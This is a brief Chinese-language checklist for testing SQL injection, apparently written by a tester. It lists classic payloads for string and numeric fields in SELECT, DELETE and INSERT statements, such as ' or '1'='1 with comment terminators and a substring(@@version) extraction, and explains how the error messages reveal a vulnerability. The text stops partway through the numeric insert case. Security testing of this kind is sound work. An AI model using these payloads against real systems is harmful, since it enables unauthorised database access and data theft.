SQL注入
Sql语句类型的考虑
	一、查询和删除：
	Select * from tablea where x= '12';
	Select * from tablea where x= 12 ;
	1.字符型输入：12 ' or '1'='1  ==> Select * from tablea where x= ' 12 ' or '1'='1 ';
	或输入：      12' or 1=1 --  ==> Select * from tablea where x= ' 12' or 1=1 -- '
	2.数字型输入：12 or 1=1 ==>  Select * from tablea where x= 12 or 1=1   
	或输入：      12 or 1=1-- ==> Select * from tablea where x= 12 or 1=1 --
	如果提示长度超过限制，则不存在风险
	3.输入：' ==> Select * from tablea where x= ' 
	如果提示You have an error in your SQL syntax则存在注入风险，如果结果为空或提示找不到...则不存在风险
	二、插入功能和修改：
	insert into table (col1,col2) values ('foo','bar');
	insert into users (name,age) values ('foo',10)
	1.字符型输入：d'+substring((select @@version),1,1)+'  ==> insert into table (col1,col2) values ('foo',' d'+substring((select @@version),1,1)+' ');
	2.数字型输入：